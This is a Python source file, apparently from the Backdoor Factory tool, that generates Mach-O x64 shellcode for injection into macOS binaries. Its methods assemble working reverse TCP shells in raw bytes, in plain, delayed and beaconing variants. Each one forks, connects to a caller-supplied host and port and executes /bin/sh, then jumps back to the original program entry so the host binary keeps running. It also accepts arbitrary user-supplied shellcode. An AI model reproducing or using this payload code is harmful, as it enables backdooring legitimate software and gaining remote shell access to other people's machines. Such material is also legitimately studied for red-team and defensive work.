'''

Copyright (c) 2013-2014, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct


class macho_intel64_shellcode():
    """
    Mach-O Intel x64 shellcode Class
    """

    def __init__(self, HOST, PORT, jumpLocation=0x0, SUPPLIED_SHELLCODE=None, BEACON=15):
        self.HOST = HOST
        self.PORT = PORT
        self.jumpLocation = jumpLocation
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.BEACON = BEACON
        self.shellcode = ""

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def delay_reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
        self.shellcode2 += "\x48\x05"
        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
                            )

        self.shellcode2 += ("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                            "\x00\x02"
                            )

        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = ("\xb8"
                           "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                           "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                           "\x00\x02"
                           )

        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def beaconing_reverse_shell_tcp(self):
        if self.PORT is None:
            print ("Must provide port")
            return False
        if self.HOST is None:
            print ("This payload requires a HOST parameter -H")
            return False

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        self.shellcode2 = "\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2"  # FORK
        #fork
        self.shellcode2 += "\x0f\x84"                           # TO TIME CHECK
        self.shellcode2 += "\x6c\x00\x00\x00"

        #self.shellcode1 = "\xe9\x6c\x00\x00\x00"

        self.shellcode2 += ("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                            "\x00\x02"
                            )
        self.shellcode2 += struct.pack(">H", self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"
                            )
        #TIME CHECK

        self.shellcode2 += "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
        self.shellcode2 += "\x48\x05"
        self.shellcode2 += struct.pack("<I", self.BEACON)  # add rax, 15  for seconds
        self.shellcode2 += ("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xf0\xff\xff\xff"      # jne back to system time
                            "\xe9\x60\xff\xff\xff\xff"      # jmp back to FORK
                            )

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset

        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)

    def user_supplied_shellcode(self):
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        
        self.shellcode2 = supplied_shellcode

        self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
        self.shellcode1 += "\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset
        if self.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return (self.shellcode1 + self.shellcode2)
